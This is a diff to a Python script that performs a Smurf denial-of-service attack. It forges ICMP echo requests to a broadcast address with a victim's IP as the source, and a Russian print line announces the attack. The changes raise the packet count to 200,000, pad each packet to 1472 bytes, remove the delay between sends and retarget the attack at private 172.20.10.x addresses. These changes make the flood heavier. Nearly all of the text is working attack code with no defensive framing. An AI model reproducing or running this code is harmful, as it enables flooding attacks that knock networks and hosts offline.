@@ -4,10 +4,9 @@ import threading
 import time
 
 ICMP_ECHO_REQUEST = 8
-PACKETS_COUNTER = 100
+PACKETS_COUNTER = 200000
 DELAY = 0.01
-THREADS = 4
-
+THREADS = 1
 
 def calculate_checksum(source_string):
     count_to = (len(source_string) / 2) * 2
@@ -34,8 +33,9 @@ def calculate_checksum(source_string):
 
 
 def create_icmp_packet():
+    # ICMP-header: type (8), code (8), checksum (16), id (16), sequence (16)
     icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, 1, 1)
-    data = struct.pack('d', time.time())
+    data = b'Q' * 1472
 
     checksum = calculate_checksum(icmp_header + data)
     icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(checksum), 1, 1)
@@ -44,12 +44,12 @@ def create_icmp_packet():
 
 
 def create_ip_header(source_ip, destination_ip):
-    version_ihl = (4 << 4) + 5  # Version 4, IHL (Internet Header Length) 5 dword
-    tos = 0
-    total_length = 20 + 8  # IP header + ICMP packet
-    ip_id = 54321  # ID of this packet
+    version_ihl = (4 << 4) + 5  # IHL (Internet Header Length) in dwords
+    tos = 0  # type of service
+    total_length = 20 + 8
+    ip_id = 54321
     fragment_offset = 0
-    ttl = 255  # Time to live
+    ttl = 255
     protocol = socket.IPPROTO_ICMP
     checksum = 0
 
@@ -83,8 +83,6 @@ def send_smurf_attack(broadcast_ip, victim_ip):
 
         print(f"Смурф-атака на {victim_ip} через {broadcast_ip}")
 
-        time.sleep(DELAY)
-
 
 def thread_smurf_attack(broadcast_ip, victim_ip):
     threads = []
@@ -97,7 +95,7 @@ def thread_smurf_attack(broadcast_ip, victim_ip):
     for t in threads:
         t.join()
 
-broadcast_ip = "172.20.10.255"
-victim_ip = "172.20.10.3"
+broadcast_ip = "172.20.10.15"
+victim_ip = "172.20.10.4"
 
 thread_smurf_attack(broadcast_ip, victim_ip)
